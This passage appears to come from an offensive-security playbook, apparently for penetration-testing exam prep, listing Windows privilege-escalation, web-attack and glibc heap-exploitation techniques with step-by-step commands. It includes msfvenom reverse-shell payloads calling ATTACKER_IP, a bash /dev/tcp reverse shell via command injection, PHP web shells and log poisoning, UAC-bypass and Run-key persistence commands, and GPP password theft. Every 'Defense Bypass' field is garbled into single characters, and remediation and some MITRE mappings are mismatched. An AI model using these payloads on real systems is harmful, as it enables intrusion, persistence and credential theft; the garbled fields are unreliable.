  1. {'step': 1, 'description': 'Check AlwaysInstallElevated registry keys', 'command': 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', 'note': 'Check both HKLM and HKCU; both must be 1'}
  2. {'step': 2, 'description': 'Generate malicious MSI payload', 'command': 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o evil.msi', 'note': 'Generate reverse shell MSI package'}
  3. {'step': 3, 'description': 'Install MSI as SYSTEM', 'command': 'msiexec /quiet /qn /i evil.msi', 'note': 'Installs without prompts; executes payload as SYSTEM'}
  4. {'step': 4, 'description': 'Catch SYSTEM shell', 'command': 'rlwrap nc -lnvp 4444', 'note': 'Listener receives SYSTEM-level reverse shell'}
- Related Tools: 15 — accesschk, beroot, find, getcap, godpotato, icacls, impacket, jucypotato, juicy-potato, lazagne, linenum, linpeas, linux-exploit-suggester, lse, msfvenom

#### unquoted-service-paths — Unquoted Service Paths
- Zone: privilege-escalation | Category: privilege-escalation | Difficulty: 2
- OS: windows
- Tags: privesc, windows, unquoted-paths, services
- Purpose: Replace service binary with malicious payload to execute as service account
- When To Use: When service path contains spaces but is not quoted
- Prerequisites: Write access to service binary directory, Service configured with unquoted path
- Defense Bypass: S, e, r, v, i, c, e,  , r, e, s, t, a, r, t,  , r, e, q, u, i, r, e, d, ;,  , p, l, a, c, i, n, g,  , f, i, l, e, s,  , i, n,  , P, r, o, g, r, a, m,  , F, i, l, e, s,  , m, a, y,  , t, r, i, g, g, e, r,  , U, A, C, /, W, i, n, d, o, w, s,  , D, e, f, e, n, d, e, r
- Remediation: Apply patches, enforce least privilege, disable SUID/SGID bits
- MITRE ID: T1543.003
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Identify unquoted service paths', 'command': 'wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\\\"', 'note': "Look for paths like 'C:\\Program Files\\App\\service.exe' (unquoted)"}
  2. {'step': 2, 'description': 'Check write permissions on path', 'command': 'icacls "C:\\Program Files\\App"', 'note': 'Look for (F), (M), or FullControl for Users/Authenticated Users'}
  3. {'step': 3, 'description': 'Generate malicious binary', 'command': 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o Program.exe', 'note': 'Create payload matching the missing executable name'}
  4. {'step': 4, 'description': 'Drop binary and restart service', 'command': 'copy payload.exe "C:\\Program Files\\App\\Program.exe" && sc start VulnerableService', 'note': 'Service runs payload as its configured account (often SYSTEM)'}
- Related Tools: 15 — accesschk, angr, beroot, checksec, curl, dig, docker, file, find, gdb, gdb-multiarch, gef, getcap, ghidra, git

#### dll-hijacking — DLL Hijacking
- Zone: privilege-escalation | Category: privilege-escalation | Difficulty: 3
- OS: windows
- Tags: privesc, windows, dll-hijacking, services
- Purpose: Execute arbitrary code by hijacking DLL loading order
- When To Use: When a service/application loads DLLs from writable paths
- Prerequisites: Writable directory in DLL search path, Knowledge of required DLL name, Service/app restart capability
- Defense Bypass: D, L, L,  , h, i, j, a, c, k, i, n, g,  , r, e, q, u, i, r, e, s,  , s, e, r, v, i, c, e,  , r, e, s, t, a, r, t, ;,  , D, e, f, e, n, d, e, r,  , m, a, y,  , f, l, a, g,  , m, a, l, i, c, i, o, u, s,  , D, L, L, s
- Remediation: Apply patches, enforce least privilege, disable SUID/SGID bits
- MITRE ID: T1574.002
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Identify DLL loading behavior', 'command': "Process Monitor: filter for 'Load Image' events and 'NAME NOT FOUND' results", 'note': 'Look for DLLs loaded from writable directories'}
  2. {'step': 2, 'description': 'Find hijackable DLL with PowerUp', 'command': 'Find-PathDLLHijack', 'note': 'PowerView/PowerUp identifies writable paths in DLL search order'}
  3. {'step': 3, 'description': 'Generate malicious DLL', 'command': 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f dll -o hijack.dll', 'note': 'Export DLL with required function exports'}
  4. {'step': 4, 'description': 'Place DLL in writable path', 'command': 'copy hijack.dll "C:\\Program Files\\App\\missing.dll"', 'note': 'Drop in directory searched before legitimate DLL location'}
- Related Tools: 15 — accesschk, beroot, find, getcap, godpotato, icacls, jucypotato, juicy-potato, lazagne, linenum, linpeas, linux-exploit-suggester, lse, msfvenom, powershell

#### token-impersonation — Token Impersonation (Potato Family)
- Zone: privilege-escalation | Category: privilege-escalation | Difficulty: 3
- OS: windows
- Tags: privesc, windows, potato, token-impersonation, seimpersonate
- Purpose: Steal privileged service tokens to escalate to SYSTEM
- When To Use: When SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege is enabled
- Prerequisites: SeImpersonatePrivilege enabled, Privileged service to coerce authentication
- Defense Bypass: T, o, k, e, n,  , i, m, p, e, r, s, o, n, a, t, i, o, n,  , g, e, n, e, r, a, t, e, s,  , p, r, o, c, e, s, s,  , c, r, e, a, t, i, o, n,  , e, v, e, n, t, s, ;,  , S, e, I, m, p, e, r, s, o, n, a, t, e,  , o, n,  , s, e, r, v, i, c, e,  , a, c, c, o, u, n, t, s,  , i, s,  , e, x, p, e, c, t, e, d,  , b, u, t,  , a, b, u, s, e,  , i, s,  , f, l, a, g, g, e, d
- Remediation: Apply patches, enforce least privilege, disable SUID/SGID bits
- MITRE ID: T1053.005
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Check available privileges', 'command': 'whoami /priv', 'note': 'Look for SeImpersonatePrivilege = Enabled'}
  2. {'step': 2, 'description': 'Choose appropriate Potato exploit', 'command': 'Depends on OS version: PrintSpoofer (modern), RoguePotato (Server 2019), JuicyPotato (older)', 'note': 'PrintSpoofer works on most modern Windows versions'}
  3. {'step': 3, 'description': 'Execute Potato exploit', 'command': 'PrintSpoofer.exe -i -c cmd', 'note': '-i flag enables impersonation'}
  4. {'step': 4, 'description': 'Verify SYSTEM access', 'command': 'whoami', 'note': 'Should show nt authority\\system'}
- Related Tools: 15 — accesschk, beroot, find, getcap, godpotato, icacls, jucypotato, juicy-potato, lazagne, linenum, linpeas, linux-exploit-suggester, lse, powershell, powerup

#### uac-bypass — UAC Bypass
- Zone: privilege-escalation | Category: privilege-escalation | Difficulty: 2
- OS: windows
- Tags: privesc, windows, uac-bypass, admin
- Purpose: Elevate from medium to high integrity without UAC prompt
- When To Use: When you are a local admin but running at medium integrity level
- Prerequisites: Local administrator account, Medium integrity level (not high)
- Defense Bypass: U, A, C,  , b, y, p, a, s, s,  , t, e, c, h, n, i, q, u, e, s,  , a, r, e,  , w, e, l, l, -, d, o, c, u, m, e, n, t, e, d, ;,  , U, A, C,  , h, a, r, d, e, n, i, n, g,  , (, A, d, m, i, n,  , A, p, p, r, o, v, a, l,  , M, o, d, e, ),  , m, i, t, i, g, a, t, e, s,  , m, a, n, y
- Remediation: Apply patches, enforce least privilege, disable SUID/SGID bits
- MITRE ID: T1548.002
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Check current integrity level', 'command': 'whoami /groups | findstr S-1-16-8192', 'note': 'S-1-16-8192 = Medium integrity; S-1-16-12288 = High integrity'}
  2. {'step': 2, 'description': 'Try fodhelper.exe bypass', 'command': 'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d "C:\\payload.exe" /f && reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v "DelegateExecute" /f && fodhelper.exe', 'note': ' fodhelper auto-elevates for admin users'}
  3. {'step': 3, 'description': 'Alternative: eventvwr.exe bypass', 'command': 'reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d "C:\\payload.exe" /f && eventvwr.msc', 'note': 'eventvwr auto-elevates and triggers registry command'}
  4. {'step': 4, 'description': 'Verify high integrity', 'command': 'whoami /groups | findstr S-1-16-12288', 'note': 'Confirms high integrity level achieved'}
- Related Tools: 15 — accesschk, beroot, find, getcap, godpotato, icacls, impacket, jucypotato, juicy-potato, lazagne, linenum, linpeas, linux-exploit-suggester, lse, metasploit

#### registry-autorun — Registry AutoRun Persistence
- Zone: privilege-escalation | Category: privilege-escalation | Difficulty: 2
- OS: windows
- Tags: privesc, windows, registry, persistence, autorun
- Purpose: Persist or escalate via registry auto-execution
- When To Use: When you have write access to HKLM Run/RunOnce keys or writable autorun binaries
- Prerequisites: Write access to HKLM\Software\Microsoft\Windows\CurrentVersion\Run, Admin logon to trigger execution
- Defense Bypass: R, e, g, i, s, t, r, y,  , R, u, n,  , k, e, y, s,  , a, r, e,  , c, o, m, m, o, n, l, y,  , m, o, n, i, t, o, r, e, d, ;,  , p, a, y, l, o, a, d, s,  , i, n,  , P, r, o, g, r, a, m,  , F, i, l, e, s,  , m, a, y,  , b, e,  , s, c, a, n, n, e, d
- Remediation: Apply patches, enforce least privilege, disable SUID/SGID bits
- MITRE ID: T1547.001
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Enumerate Run keys', 'command': 'reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', 'note': 'Check both HKLM and HKCU Run/RunOnce keys'}
  2. {'step': 2, 'description': 'Check permissions on existing binaries', 'command': 'icacls "C:\\Program Files\\App\\existing.exe"', 'note': 'If writable by low-priv user, replace with payload'}
  3. {'step': 3, 'description': 'Add malicious entry to Run key', 'command': 'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Evil /t REG_SZ /d "C:\\payload.exe" /f', 'note': 'Executes payload at next user logon'}
  4. {'step': 4, 'description': 'Wait for admin logon or force logoff', 'command': 'shutdown /r /t 0 (if you have access)', 'note': 'Payload executes as admin when they log back in'}
- Related Tools: 15 — accesschk, beroot, find, getcap, godpotato, icacls, impacket, jucypotato, juicy-potato, lazagne, linenum, linpeas, linux-exploit-suggester, lse, powershell

#### weak-service-permissions — Weak Service Permissions
- Zone: privilege-escalation | Category: privilege-escalation | Difficulty: 2
- OS: windows
- Tags: privesc, windows, services, permissions, accesschk
- Purpose: Reconfigure or replace service binary to execute arbitrary code
- When To Use: When accesschk shows Authenticated Users have SERVICE_CHANGE_CONFIG or write access on service binary
- Prerequisites: Write/modify permissions on service or its binary, Service configured to run as SYSTEM/LocalSystem
- Defense Bypass: S, e, r, v, i, c, e,  , c, o, n, f, i, g, u, r, a, t, i, o, n,  , c, h, a, n, g, e, s,  , a, r, e,  , l, o, g, g, e, d,  , i, n,  , S, y, s, t, e, m,  , e, v, e, n, t,  , l, o, g, ;,  , m, o, d, i, f, y, i, n, g,  , S, Y, S, T, E, M,  , s, e, r, v, i, c, e, s,  , t, r, i, g, g, e, r, s,  , a, l, e, r, t, s
- Remediation: Apply patches, enforce least privilege, disable SUID/SGID bits
- MITRE ID: T1543.003
- Command: #
- Steps (3):
  1. {'step': 1, 'description': 'Enumerate service permissions', 'command': 'accesschk.exe -uwcqv "Authenticated Users" * /accepteula', 'note': 'Sysinternals accesschk shows services with weak permissions'}
  2. {'step': 2, 'description': 'Reconfigure service binary path', 'command': 'sc config VulnSvc binpath= "C:\\payload.exe" obj= LocalSystem', 'note': 'Changes service to execute payload as SYSTEM'}
  3. {'step': 3, 'description': 'Restart service', 'command': 'sc stop VulnSvc && sc start VulnSvc', 'note': 'Service executes payload with its configured account privileges'}
- Related Tools: 15 — accesschk, angr, beroot, checksec, curl, dig, docker, file, find, gdb, gdb-multiarch, gef, getcap, ghidra, git

#### gpp-cached-passwords — GPP Cached Passwords
- Zone: privilege-escalation | Category: privilege-escalation | Difficulty: 2
- OS: windows
- Tags: privesc, windows, gpp, cpassword, sysvol
- Purpose: Decrypt cached GPP passwords for credential reuse
- When To Use: When domain-joined host can read SYSVOL share
- Prerequisites: Access to SYSVOL share (domain-joined host or credentials), GPP XML files with cpassword attribute
- Defense Bypass: G, P, P,  , p, a, s, s, w, o, r, d, s,  , a, r, e,  , l, e, g, a, c, y,  , (, r, e, m, o, v, e, d,  , i, n,  , m, o, d, e, r, n,  , W, i, n, d, o, w, s, ), ;,  , s, t, i, l, l,  , f, o, u, n, d,  , i, n,  , o, l, d, e, r,  , e, n, v, i, r, o, n, m, e, n, t, s
- Remediation: Apply patches, enforce least privilege, disable SUID/SGID bits
- MITRE ID: T1552.006
- Command: #
- Steps (3):
  1. {'step': 1, 'description': 'Search SYSVOL for cpassword', 'command': 'findstr /S /I cpassword \\\\domain\\sysvol\\domain\\policies\\*.xml', 'note': 'Looks for Groups.xml, Services.xml, ScheduledTasks.xml'}
  2. {'step': 2, 'description': 'Decrypt cpassword value', 'command': 'gpp-decrypt <cpassword_value>', 'note': 'AES-encrypted with public key; always crackable'}
  3. {'step': 3, 'description': 'Use decrypted credentials', 'command': 'impacket-psexec domain/user:decrypted_pass@TARGET', 'note': 'Credentials often work across multiple hosts in domain'}
- Related Tools: 15 — accesschk, beroot, find, getcap, godpotato, gpp-decrypt, icacls, impacket, jucypotato, juicy-potato, lazagne, linenum, linpeas, linux-exploit-suggester, lse

#### lfi-advanced — Advanced LFI & Log Poisoning
- Zone: web | Category: web | Difficulty: 3
- OS: linux, windows
- Tags: web, lfi, log-poisoning, rce, file-inclusion
- Purpose: Turn LFI into full Remote Code Execution through various techniques
- When To Use: When LFI is confirmed but write access is not obvious
- Prerequisites: Confirmed LFI vulnerability, Knowledge of web server log paths
- Defense Bypass: L, o, g,  , p, o, i, s, o, n, i, n, g,  , m, a, y,  , b, e,  , d, e, t, e, c, t, e, d,  , b, y,  , f, i, l, e,  , i, n, t, e, g, r, i, t, y,  , m, o, n, i, t, o, r, i, n, g, ;,  , d, a, t, a, :, /, /,  , w, r, a, p, p, e, r,  , r, e, q, u, i, r, e, s,  , a, l, l, o, w, _, u, r, l, _, i, n, c, l, u, d, e,  , o, r,  , P, H, P,  , <,  , 5, ., 4
- Remediation: Input validation, output encoding, parameterized queries, WAF rules
- MITRE ID: T1190
- Command: #
- Steps (6):
  1. {'step': 1, 'description': 'Confirm LFI with /etc/passwd', 'command': '?page=../../../../etc/passwd', 'note': 'Establishes traversal depth and filter behavior'}
  2. {'step': 2, 'description': 'Try log poisoning first (Apache)', 'command': "curl http://target/ -A '<?php system($_GET[cmd]); ?>'", 'note': 'Inject PHP into User-Agent header; Apache logs verbatim'}
  3. {'step': 3, 'description': 'Include poisoned log file', 'command': '?page=....//....//....//....//var/log/apache2/access.log&cmd=id', 'note': 'Execute commands through poisoned log file'}
  4. {'step': 4, 'description': 'Write persistent webshell', 'command': "&cmd=echo '<?=`$_GET[0]?>' > cmd.php", 'note': 'file_put_contents creates persistent shell in webroot'}
  5. {'step': 5, 'description': 'Alternative: PHP session poisoning', 'command': "curl 'http://target/search.php?q=<?=`$_GET[cmd]?>' -b PHPSESSID=abcd", 'note': 'Inject into session file; include sess_abcd'}
  6. {'step': 6, 'description': 'Alternative: data:// wrapper', 'command': '?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+', 'note': 'Base64-encoded PHP executed directly via data://'}
- Related Tools: 15 — aquatone, burp-suite, cewl, cmsmap, commix, corsy, evil-winrm, eyewitness, feroxbuster, ffuf, git-dumper, gobuster, httpx, jwt_tool, lfisuite

#### cmdi-advanced — Advanced OS Command Injection
- Zone: web | Category: web | Difficulty: 2
- OS: linux, windows
- Tags: web, command-injection, rce, cmdi, bypass
- Purpose: Achieve Remote Code Execution through web-application command injection
- When To Use: When web app passes user input to system()/exec()/shell_exec()/backticks
- Prerequisites: Injectable parameter that reaches system command, Knowledge of target OS and shell
- Defense Bypass: C, o, m, m, a, n, d,  , i, n, j, e, c, t, i, o, n,  , i, s,  , n, o, i, s, y, ;,  , W, A, F, s,  , m, a, y,  , f, i, l, t, e, r,  , c, o, m, m, o, n,  , o, p, e, r, a, t, o, r, s, .,  , U, s, e,  , e, n, c, o, d, i, n, g,  , a, n, d,  , b, y, p, a, s, s,  , t, e, c, h, n, i, q, u, e, s, .
- Remediation: Input validation, output encoding, parameterized queries, WAF rules
- MITRE ID: T1059.004
- Command: #
- Steps (5):
  1. {'step': 1, 'description': 'Test injection operators', 'command': '?ip=8.8.8.8; id && ?ip=8.8.8.8 | id', 'note': 'Try all operators: ; | || && & ` $() %0a'}
  2. {'step': 2, 'description': 'Confirm with identity commands', 'command': '?ip=%7C+id && ?ip=%7C+whoami', 'note': 'Verify output shows uid=33(www-data) or similar'}
  3. {'step': 3, 'description': 'Enumerate filesystem', 'command': '?ip=%7C+ls+-la+..%2F && ?ip=%7C+find+..%2F-name+*.txt', 'note': 'Look for files outside webroot with credentials'}
  4. {'step': 4, 'description': 'Check sudo permissions', 'command': '?ip=%7C+sudo+-l', 'note': 'NOPASSWD entries unlock new attack surface (e.g., systemctl)'}
  5. {'step': 5, 'description': 'Get reverse shell', 'command': "?ip=%7C+bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'", 'note': 'Bash TCP reverse shell; use fifo payload if /dev/tcp fails'}
- Related Tools: 15 — aquatone, burp-suite, cewl, cmsmap, commix, corsy, evil-winrm, eyewitness, feroxbuster, ffuf, git-dumper, gobuster, httpx, jwt_tool, lfisuite

#### wordpress-exploitation — WordPress Exploitation
- Zone: web | Category: web | Difficulty: 2
- OS: linux
- Tags: web, wordpress, cms, wpscan, rce, bruteforce
- Purpose: Compromise WordPress installations from initial access to full RCE
- When To Use: When target runs WordPress CMS
- Prerequisites: WordPress identified on target, WPScan for enumeration, Brute-force or exploit path to credentials
- Defense Bypass: W, o, r, d, P, r, e, s, s,  , b, r, u, t, e,  , f, o, r, c, e,  , g, e, n, e, r, a, t, e, s,  , l, o, g, i, n,  , l, o, g, s, ;,  , T, h, e, m, e,  , E, d, i, t, o, r,  , a, c, c, e, s, s,  , i, s,  , l, o, g, g, e, d, .,  , D, I, S, A, L, L, O, W, _, F, I, L, E, _, E, D, I, T,  , b, l, o, c, k, s,  , e, d, i, t, o, r,  , R, C, E, .
- Remediation: Input validation, output encoding, parameterized queries, WAF rules
- MITRE ID: T1190
- Command: #
- Steps (5):
  1. {'step': 1, 'description': 'Fingerprint WordPress version', 'command': 'curl -s http://target/ | grep -i generator && wpscan --url http://target/ -e vp,u,vt,cb,m', 'note': 'WPScan identifies version, plugins, themes, and users'}
  2. {'step': 2, 'description': 'Enumerate users', 'command': 'wpscan --url http://target/ --enumerate u && curl http://target/?author=1 -I', 'note': '?author=1 redirect reveals username in URL'}
  3. {'step': 3, 'description': 'Brute force credentials', 'command': 'wpscan --url http://target/ --usernames admin --passwords rockyou.txt', 'note': 'Or use XML-RPC multicall for amplification'}
  4. {'step': 4, 'description': 'Exploit via Theme Editor RCE', 'command': 'Log into wp-admin → Appearance → Theme Editor → 404.php → paste PHP reverse shell → Update', 'note': 'Fastest authenticated RCE path'}
  5. {'step': 5, 'description': 'Trigger and catch shell', 'command': 'curl http://target/nonexistent-page && rlwrap nc -lnvp 443', 'note': 'Requesting bad URL invokes 404.php with shell'}
- Related Tools: 15 — aquatone, burp-suite, cewl, cmsmap, commix, corsy, crunch, eyewitness, feroxbuster, ffuf, git-dumper, gobuster, httpx, hydra, jwt_tool

#### burp-workflow — Burp Suite Workflow
- Zone: web | Category: web | Difficulty: 2
- OS: any
- Tags: web, burp, proxy, testing, workflow
- Purpose: Systematic web application testing using Burp Suite
- When To Use: For every web application interaction in CPENT
- Prerequisites: Burp Suite installed and configured, Browser proxy set to Burp
- Defense Bypass: B, u, r, p,  , t, r, a, f, f, i, c,  , m, a, y,  , b, e,  , d, e, t, e, c, t, e, d,  , b, y,  , W, A, F, s, ;,  , u, s, e,  , r, a, n, d, o, m,  , U, s, e, r, -, A, g, e, n, t,  , a, n, d,  , t, h, r, o, t, t, l, e,  , r, e, q, u, e, s, t, s
- Remediation: Input validation, output encoding, parameterized queries, WAF rules
- MITRE ID: N/A
- Command: #
- Steps (5):
  1. {'step': 1, 'description': 'Configure browser proxy', 'command': 'Browser proxy: 127.0.0.1:8080; import Burp CA certificate', 'note': 'Required for intercepting HTTPS traffic'}
  2. {'step': 2, 'description': 'Intercept and analyze requests', 'command': 'Burp Proxy > Intercept On; submit forms to capture requests', 'note': 'Save interesting requests for sqlmap, Commix, or manual analysis'}
  3. {'step': 3, 'description': 'Send to Repeater for manual testing', 'command': 'Right-click request > Send to Repeater; modify and resend', 'note': 'Test SQLi, LFI, command injection parameters manually'}
  4. {'step': 4, 'description': 'Use Intruder for brute force', 'command': 'Send to Intruder > Cluster bomb/Sniper > load payloads from SecLists', 'note': 'Brute force logins, OTPs, or fuzz parameters'}
  5. {'step': 5, 'description': 'Use Collaborator for OOB', 'command': 'Burp > Burp Collaborator > generate payload > inject into tests', 'note': 'Detect blind injection via DNS/HTTP callbacks'}
- Related Tools: 15 — aquatone, burp-suite, cewl, chisel, cmsmap, commix, corsy, eyewitness, feroxbuster, ffuf, git-dumper, gobuster, httpx, jwt_tool, lfisuite

#### heap-tcache-poison — Tcache Poisoning
- Zone: binary-exploitation | Category: binary-exploitation | Difficulty: 4
- OS: linux
- Tags: binary, heap, tcache, glibc, exploitation
- Purpose: Arbitrary write primitive via tcache freelist corruption
- When To Use: When binary uses malloc/free and glibc 2.26+ (tcache enabled)
- Prerequisites: Heap overflow or info leak, glibc 2.26+, Two free() on same size chunk
- Defense Bypass: T, c, a, c, h, e,  , p, o, i, s, o, n, i, n, g,  , r, e, q, u, i, r, e, s,  , s, p, e, c, i, f, i, c,  , g, l, i, b, c,  , v, e, r, s, i, o, n, ;,  , t, c, a, c, h, e,  , d, o, u, b, l, e, -, f, r, e, e,  , p, r, o, t, e, c, t, i, o, n,  , (, g, l, i, b, c,  , 2, ., 3, 2, +, ),  , a, d, d, s,  , s, e, c, u, r, i, t, y,  , c, h, e, c, k, s
- Remediation: Enable stack canaries, ASLR, DEP/NX, PIE, RELRO
- MITRE ID: T1059.007
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Allocate and free tcache-sized chunks', 'command': 'malloc(0x90); free(chunk); free(chunk);', 'note': 'Two frees put chunk in tcache freelist'}
  2. {'step': 2, 'description': 'Corrupt fd pointer via overflow', 'command': 'Overwrite chunk->fd with target_address', 'note': 'Next malloc will return target_address'}
  3. {'step': 3, 'description': 'Allocate poisoned chunk', 'command': 'malloc(0x90); // returns target_address', 'note': 'Write to allocated chunk writes to arbitrary address'}
  4. {'step': 4, 'description': 'Exploit arbitrary write', 'command': 'Write to target (e.g., __free_hook, __malloc_hook)', 'note': 'Overwrite function pointers for code execution'}
- Related Tools: 15 — ROPgadget, angr, checksec, commix, curl, dig, docker, file, find, gcc, gdb, gdb-multiarch, gdb-peda, gef, getcap

#### heap-fastbin-dup — Fastbin Double Free
- Zone: binary-exploitation | Category: binary-exploitation | Difficulty: 4
- OS: linux
- Tags: binary, heap, fastbin, double-free, glibc
- Purpose: Corrupt fastbin freelist for arbitrary malloc control
- When To Use: When binary frees the same pointer twice and uses fastbin-sized allocations
- Prerequisites: Double free of same chunk, Fastbin-sized allocation (0x20-0x80 on 64-bit), No fastbin double-free check (glibc < 2.31)
- Defense Bypass: g, l, i, b, c,  , 2, ., 3, 1, +,  , a, d, d, s,  , d, o, u, b, l, e, -, f, r, e, e,  , d, e, t, e, c, t, i, o, n, ;,  , r, e, q, u, i, r, e, s,  , _, i, n, t, _, f, r, e, e,  , c, h, e, c, k,  , b, y, p, a, s, s,  , o, r,  , o, l, d, e, r,  , g, l, i, b, c
- Remediation: Enable stack canaries, ASLR, DEP/NX, PIE, RELRO
- MITRE ID: T1059.007
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Trigger double free', 'command': 'free(chunk); free(chunk);', 'note': 'Same chunk freed twice'}
  2. {'step': 2, 'description': 'Corrupt fd pointer', 'command': 'Overwrite chunk->fd with target_address - 0x10', 'note': 'Next malloc will place target_address in freelist'}
  3. {'step': 3, 'description': 'Allocate corrupted chunk', 'command': 'malloc(0x60); // returns target_address - 0x10', 'note': 'Second allocation returns corrupted pointer'}
  4. {'step': 4, 'description': 'Write to arbitrary address', 'command': 'malloc(0x60); // write to target_address', 'note': 'Overwrite __malloc_hook or free_hook for code execution'}
- Related Tools: 15 — ROPgadget, angr, checksec, curl, dig, docker, file, find, gcc, gdb, gdb-multiarch, gdb-peda, gef, getcap, ghidra

#### heap-unsorted-bin-attack — Unsorted Bin Attack
- Zone: binary-exploitation | Category: binary-exploitation | Difficulty: 4
- OS: linux
- Tags: binary, heap, unsorted-bin, arbitrary-write, glibc
- Purpose: Arbitrary write primitive via unsorted bin corruption
- When To Use: When you can corrupt a freed unsorted bin chunk's bk pointer
- Prerequisites: Heap leak (libc base), Ability to corrupt freed unsorted bin chunk, Unsafe unlink disabled
- Defense Bypass: U, n, s, o, r, t, e, d,  , b, i, n,  , a, t, t, a, c, k,  , r, e, q, u, i, r, e, s,  , s, p, e, c, i, f, i, c,  , c, o, n, d, i, t, i, o, n, s, ;,  , m, o, d, e, r, n,  , g, l, i, b, c,  , h, a, s,  , a, d, d, i, t, i, o, n, a, l,  , s, a, f, e, t, y,  , c, h, e, c, k, s
- Remediation: Enable stack canaries, ASLR, DEP/NX, PIE, RELRO
- MITRE ID: T1059.007
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Create unsorted bin chunk', 'command': 'malloc(0x100); free(chunk);', 'note': 'Large chunk goes to unsorted bin'}
  2. {'step': 2, 'description': 'Overwrite bk pointer', 'command': 'Overwrite chunk->bk with target_address - 0x10', 'note': "Victim chunk's bk pointer corrupted"}
  3. {'step': 3, 'description': 'Trigger unsorted bin consolidation', 'command': 'malloc(0x100); // new chunk consolidates with victim', 'note': 'malloc triggers unsorted bin traversal, writes large value to target'}
  4. {'step': 4, 'description': 'Leverage arbitrary write', 'command': 'Overwritten value at target_address - 0x10', 'note': 'Typically used to corrupt __malloc_hook or free_hook'}
- Related Tools: 15 — ROPgadget, angr, checksec, curl, dig, docker, file, find, gcc, gdb, gdb-multiarch, gdb-peda, gef, getcap, ghidra

#### heap-house-of-force — House of Force
- Zone: binary-exploitation | Category: binary-exploitation | Difficulty: 4
- OS: linux
- Tags: binary, heap, house-of-force, top-chunk, arbitrary-write
- Purpose: Control next malloc() return address via top chunk corruption
- When To Use: When top chunk size is writable and no ASLR or leak available
- Prerequisites: Heap overflow reaching top chunk, Ability to write top chunk size, No ASLR or known libc base
- Defense Bypass: R, e, q, u, i, r, e, s,  , h, e, a, p,  , o, v, e, r, f, l, o, w, ;,  , m, o, d, e, r, n,  , g, l, i, b, c,  , h, a, s,  , t, o, p,  , c, h, u, n, k,  , i, n, t, e, g, r, i, t, y,  , c, h, e, c, k, s,  , (, g, l, i, b, c,  , 2, ., 2, 9, +, )
- Remediation: Enable stack canaries, ASLR, DEP/NX, PIE, RELRO
- MITRE ID: T1059.007
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Overwrite top chunk size', 'command': 'Overwrite top_chunk->size with -1 (0xFFFFFFFFFFFFFFFF)', 'note': 'Makes top chunk appear very large'}
  2. {'step': 2, 'description': 'Calculate distance to target', 'command': 'distance = target_address - current_brk', 'note': "Calculate how far to 'walk' the heap"}
  3. {'step': 3, 'description': 'Request large allocation', 'command': 'malloc(distance);', 'note': 'Consumes the corrupted top chunk'}
  4. {'step': 4, 'description': 'Next malloc returns target', 'command': 'malloc(0x100); // returns target_address', 'note': 'Now can write to arbitrary address'}
- Related Tools: 15 — ROPgadget, angr, checksec, curl, dig, docker, file, find, gcc, gdb, gdb-multiarch, gdb-peda, gef, getcap, ghidra

#### heap-use-after-free — Use-After-Free (UAF)
- Zone: binary-exploitation | Category: binary-exploitation | Difficulty: 4
- OS: linux
- Tags: binary, heap, uaf, use-after-free, exploitation
- Purpose: Exploit dangling pointers to control program flow or data
- When To Use: When freed memory can be reallocated with attacker-controlled data
- Prerequisites: Free() without nulling pointer, Ability to reallocate freed memory, Control over reallocated content
- Defense Bypass: U, A, F,  , r, e, q, u, i, r, e, s,  , s, p, e, c, i, f, i, c,  , t, i, m, i, n, g, ;,  , m, o, d, e, r, n,  , a, l, l, o, c, a, t, o, r, s,  , h, a, v, e,  , u, s, e, -, a, f, t, e, r, -, f, r, e, e,  , d, e, t, e, c, t, i, o, n,  , (, t, c, a, c, h, e, ,,  , s, a, f, e,  , l, i, n, k, i, n, g, )
- Remediation: Enable stack canaries, ASLR, DEP/NX, PIE, RELRO
- MITRE ID: T1059.007
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Free chunk but keep reference', 'command': 'free(chunk); // pointer still exists in code', 'note': 'Dangling pointer to freed memory'}
  2. {'step': 2, 'description': 'Reallocate with controlled data', 'command': 'malloc(size); // gets same memory as freed chunk', 'note': 'New allocation at same address'}
  3. {'step': 3, 'description': 'Overwrite data via UAF', 'command': 'Write to reallocated chunk (e.g., function pointer, vtable)', 'note': 'Old pointer now points to attacker-controlled data'}
  4. {'step': 4, 'description': 'Trigger code execution', 'command': 'Trigger code path using dangling pointer', 'note': 'Calls overwritten function pointer or virtual method'}
- Related Tools: 15 — ROPgadget, angr, checksec, commix, curl, dig, docker, file, find, gcc, gdb, gdb-multiarch, gdb-peda, gef, getcap

#### heap-double-free — Double Free
- Zone: binary-exploitation | Category: binary-exploitation | Difficulty: 4
- OS: linux
- Tags: binary, heap, double-free, freelist, corruption
- Purpose: Corrupt heap freelists for arbitrary write
- When To Use: When binary frees the same chunk twice and doesn't have double-free detection
- Prerequisites: Double free of same chunk, glibc without tcache double-free detection or bypass
- Defense Bypass: g, l, i, b, c,  , 2, ., 3, 1, +,  , h, a, s,  , t, c, a, c, h, e,  , d, o, u, b, l, e, -, f, r, e, e,  , d, e, t, e, c, t, i, o, n, ;,  , r, e, q, u, i, r, e, s,  , g, l, i, b, c,  , <,  , 2, ., 3, 1,  , o, r,  , b, y, p, a, s, s
